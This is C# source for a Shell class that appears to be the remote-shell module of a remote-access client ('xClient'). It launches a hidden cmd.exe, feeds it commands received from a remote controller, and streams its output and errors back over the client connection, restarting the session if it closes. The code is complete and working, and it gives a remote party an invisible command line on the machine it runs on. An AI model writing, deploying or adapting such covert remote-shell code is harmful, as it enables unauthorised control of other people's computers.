using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

namespace xClient.Core.RemoteShell
{
    public class Shell : IDisposable
    {
        private Process _prc;
        private bool _read;
        private readonly object _readLock = new object();
        private readonly object _readStreamLock = new object();

        private void CreateSession()
        {
            lock (_readLock)
            {
                _read = true;
            }

            _prc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    Arguments = "/K"
                }
            };

            _prc.Start();

            // Fire up the logic to redirect the outputs and handle them.
            RedirectOutputs();

            new Packets.ClientPackets.DoShellExecuteResponse(Environment.NewLine + ">> New Session created" + Environment.NewLine).Execute(
                Program.ConnectClient);
        }

        private void RedirectOutputs()
        {
            ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardOutput(); });
            ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardError(); });
        }

        private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
        {
            lock (_readStreamLock)
            {
                StringBuilder streambuffer = new StringBuilder();

                streambuffer.Append((char)firstCharRead);

                // While there are more characters to be read
                while (streamReader.Peek() > -1)
                {
                    // Read the character in the queue
                    var ch = streamReader.Read();

                    // Accumulate the characters read in the stream buffer
                    streambuffer.Append((char)ch);

                    if (ch == '\n')
                        SendAndFlushBuffer(ref streambuffer, isError);
                }
                // Flush any remaining text in the buffer
                SendAndFlushBuffer(ref streambuffer, isError);
            }
        }

        private void SendAndFlushBuffer(ref StringBuilder textbuffer, bool isError)
        {
            if (textbuffer.Length == 0) return;

            var toSend = textbuffer.ToString();

            if (string.IsNullOrEmpty(toSend)) return;

            if (isError)
            {
                new Packets.ClientPackets.DoShellExecuteResponse(toSend, true).Execute(
                    Program.ConnectClient);
            }
            else
            {
                new Packets.ClientPackets.DoShellExecuteResponse(toSend).Execute(
                    Program.ConnectClient);
            }

            textbuffer.Length = 0;
        }

        private void RedirectStandardOutput()
        {
            try
            {
                int ch;

                // The Read() method will block until something is available
                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardOutput.Read()) > -1)
                {
                    ReadStream(ch, _prc.StandardOutput, false);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("session unexpectedly closed");
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                // just exit
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    new Packets.ClientPackets.DoShellExecuteResponse(string.Format("{0}>> Session unexpectedly closed{0}",
                        Environment.NewLine), true).Execute(Program.ConnectClient);

                    CreateSession();
                }
            }
        }

        private void RedirectStandardError()
        {
            try
            {
                int ch;

                // The Read() method will block until something is available
                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardError.Read()) > -1)
                {
                    ReadStream(ch, _prc.StandardError, true);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("session unexpectedly closed");
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                // just exit
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    new Packets.ClientPackets.DoShellExecuteResponse(string.Format("{0}>> Session unexpectedly closed{0}",
                        Environment.NewLine), true).Execute(Program.ConnectClient);

                    CreateSession();
                }
            }
        }

        public bool ExecuteCommand(string command)
        {
            if (_prc == null || _prc.HasExited)
                CreateSession();

            if (_prc == null) return false;

            _prc.StandardInput.WriteLine(command);
            _prc.StandardInput.Flush();

            return true;
        }

        public Shell()
        {
            CreateSession();
        }

        public void Dispose()
        {
            Dispose(true);

            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_readLock)
                {
                    _read = false;
                }

                try
                {
                    if (_prc != null)
                    {
                        if (!_prc.HasExited)
                        {
                            try
                            {
                                _prc.Kill();
                            }
                            catch
                            {
                            }
                        }
                        _prc.Dispose();
                        _prc = null;
                    }
                }
                catch
                {
                }
            }
        }
    }
}